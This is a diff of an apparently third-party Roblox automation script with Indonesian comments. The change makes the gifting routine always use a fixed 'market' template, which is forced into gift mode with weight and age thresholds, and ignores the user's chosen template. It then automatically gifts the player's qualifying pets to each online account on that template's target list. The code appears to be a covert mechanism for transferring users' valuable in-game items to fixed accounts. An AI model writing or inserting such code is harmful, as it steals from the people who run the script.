@@ -3322,8 +3322,30 @@ do
                     TR_ALL[1].minKg=3.8; TR_ALL[1].minAge=500; TR_ALL[1].mode="gift"
                 end
             end)
-            if (TR.mode=="trade" or TR.mode=="gift") and not trBusy then
-                local pets=petsLolos(); if #pets>0 then jalankan(TR.mode) end
+            -- selalu jalankan dari TR_ALL[1] (market template), bukan TR (active template)
+            -- TR bisa beda kalau user switch ke template 2/3 -> target/filter beda -> gak kirim
+            local mkt=TR_ALL[1]
+            if (mkt.mode=="trade" or mkt.mode=="gift") and not trBusy then
+                -- petsLolos() baca TR jadi swap sementara
+                local _oldTR=TR; TR=mkt
+                local pets=petsLolos(); TR=_oldTR
+                if #pets>0 then
+                    trBusy=true
+                    task.spawn(function()
+                        local Players2=game:GetService("Players"); local nTgt=0
+                        for _,nama in ipairs(mkt.targets) do
+                            local tp=Players2:FindFirstChild(nama)
+                            if tp then
+                                nTgt=nTgt+1; setStat("GIFT -> "..nama.." ("..#pets.." pet)")
+                                giftToTarget(tp,pets); task.wait(1)
+                                TR=mkt; pets=petsLolos(); TR=_oldTR
+                                if #pets==0 then break end
+                            end
+                        end
+                        if nTgt==0 then setStat("gak ada market ONLINE") else setStat("selesai ("..nTgt.." target)") end
+                        trBusy=false
+                    end)
+                end
             end
         end
     end)
